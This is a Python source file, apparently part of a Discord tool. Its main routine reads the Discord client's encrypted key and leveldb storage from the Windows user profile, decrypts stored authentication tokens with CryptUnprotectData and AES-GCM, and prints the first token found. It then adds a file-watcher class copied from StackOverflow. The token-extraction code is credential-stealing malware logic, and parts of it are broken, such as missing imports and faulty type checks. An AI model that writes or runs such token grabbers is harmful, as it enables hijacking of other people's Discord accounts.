from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getlogin, listdir
from json import loads
from re import findall
from subprocess import Popen


def isSomething(inp, list_of_interested, accuracy):
    if list_of_interested is list:
        for seggs in list_of_interested:
            if Levenshtein.ratio(inp, seggs) >= accuracy:
                return True
            else:
                pass
        return False
    else:
        if Levenshtein.ratio(inp, list_of_interested) >= accuracy:
            return True
        else:
            return False
    # print(f"{inp} == {list_of_interested} ? Accuracy: {ratio}")

tokens = []
cleaned = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return "An error has occured.\n" + e

def get_tokens(debug):
    with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local State", "r") as file:
        key = loads(file.read())['os_crypt']['encrypted_key']
        file.close()

    for file in listdir(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\"):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue
        else:
            try:
                with open(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError:
                continue

    for i in tokens:
        if i.endswith("\\"):
            i.replace("\\", "")
        elif i not in cleaned:
            cleaned.append(i)
    token = decrypt(b64decode(cleaned[0].split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
    print(f'Token found: {token}')

    return token


# https://stackoverflow.com/questions/182197/how-do-i-watch-a-file-for-changes
class FileWatch:
    def __init__(self, filepath):
        self.filename = filepath
        self._cached_stamp = os.path.getmtime(filepath)

    def watch(self):
        stamp = os.stat(self.filename).st_mtime
        if stamp != self._cached_stamp:
            self._cached_stamp = stamp
            return True
        
